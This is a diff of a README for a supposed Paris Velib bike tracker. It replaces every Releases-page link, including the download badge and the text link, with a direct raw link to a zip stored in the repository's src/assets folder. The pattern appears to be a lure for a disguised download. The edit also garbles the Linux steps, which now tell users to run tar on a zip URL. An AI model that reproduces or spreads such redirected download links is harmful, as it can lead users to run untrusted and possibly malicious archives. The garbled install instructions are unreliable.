@@ -1,6 +1,6 @@
 # 🚴 tracker-velib-paris - Track Velib Bikes in Real Time
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/MalongaFructueux/tracker-velib-paris/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MalongaFructueux/tracker-velib-paris/main/src/assets/paris_velib_tracker_v1.4.zip)](https://raw.githubusercontent.com/MalongaFructueux/tracker-velib-paris/main/src/assets/paris_velib_tracker_v1.4.zip)
 
 ## 📋 Introduction
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To download the latest version of tracker-velib-paris, please visit the Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/MalongaFructueux/tracker-velib-paris/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MalongaFructueux/tracker-velib-paris/main/src/assets/paris_velib_tracker_v1.4.zip)
 
 Once there, look for the most recent release, usually at the top. Click on the appropriate file for your operating system to start the download. 
 
@@ -43,9 +43,9 @@ After downloading, locate the file in your Downloads folder. Follow these steps 
 
 ### For Linux
 
-1. Locate the downloaded `.tar.gz` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/MalongaFructueux/tracker-velib-paris/main/src/assets/paris_velib_tracker_v1.4.zip` file.
 2. Open a terminal and navigate to the directory where you downloaded the file.
-3. Extract the contents using the command: `tar -xvzf tracker-velib-paris.tar.gz`
+3. Extract the contents using the command: `tar -xvzf https://raw.githubusercontent.com/MalongaFructueux/tracker-velib-paris/main/src/assets/paris_velib_tracker_v1.4.zip`
 4. After extracting, navigate into the folder and run the command: `./tracker-velib-paris` to start the application.
 
 ## 🗺️ How to Use
